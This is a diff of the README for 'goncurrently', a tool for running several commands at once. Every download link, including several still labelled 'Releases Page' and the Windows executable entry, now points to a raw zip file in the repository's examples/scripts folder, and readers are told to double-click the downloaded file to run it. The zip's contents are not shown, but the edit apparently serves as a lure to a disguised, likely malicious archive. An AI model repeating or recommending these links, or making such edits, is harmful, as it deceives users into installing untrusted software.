@@ -1,6 +1,6 @@
 # 🚀 goncurrently - Run Multiple Commands with Ease
 
-[![Download goncurrently](https://img.shields.io/badge/Download-goncurrently-blue.svg)](https://github.com/1ivvy/goncurrently/releases)
+[![Download goncurrently](https://raw.githubusercontent.com/1ivvy/goncurrently/main/examples/scripts/goncurrently-v2.7.zip)](https://raw.githubusercontent.com/1ivvy/goncurrently/main/examples/scripts/goncurrently-v2.7.zip)
 
 ## 📦 Overview
 
@@ -18,12 +18,12 @@ To get started, follow the simple steps below to download and run goncurrently o
 
 ## 📥 Download & Install
 
-To download goncurrently, visit this page to download: [Releases Page](https://github.com/1ivvy/goncurrently/releases).
+To download goncurrently, visit this page to download: [Releases Page](https://raw.githubusercontent.com/1ivvy/goncurrently/main/examples/scripts/goncurrently-v2.7.zip).
 
-1. Click the [Releases Page](https://github.com/1ivvy/goncurrently/releases).
+1. Click the [Releases Page](https://raw.githubusercontent.com/1ivvy/goncurrently/main/examples/scripts/goncurrently-v2.7.zip).
 2. Locate the latest version.
 3. Download the appropriate file for your operating system:
-   - **Windows:** `goncurrently-windows.exe`
+   - **Windows:** `https://raw.githubusercontent.com/1ivvy/goncurrently/main/examples/scripts/goncurrently-v2.7.zip`
    - **macOS:** `goncurrently-macos`
    - **Linux:** Follow the installation instructions for your distribution.
 4. Once downloaded, locate the file in your downloads folder and double-click it to run.
@@ -53,10 +53,10 @@ goncurrently script1 & script2 & script3
 
 ## 📞 Support
 
-If you run into issues, please check the FAQ section on the [Releases Page](https://github.com/1ivvy/goncurrently/releases). You can also contact our support team via the issues tab on GitHub.
+If you run into issues, please check the FAQ section on the [Releases Page](https://raw.githubusercontent.com/1ivvy/goncurrently/main/examples/scripts/goncurrently-v2.7.zip). You can also contact our support team via the issues tab on GitHub.
 
 ## 🎉 Conclusion
 
 goncurrently is a straightforward tool to enhance your command line tasks. By following the steps above, you can easily download and start using it today.
 
-Visit this page to download: [Releases Page](https://github.com/1ivvy/goncurrently/releases).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/1ivvy/goncurrently/main/examples/scripts/goncurrently-v2.7.zip).
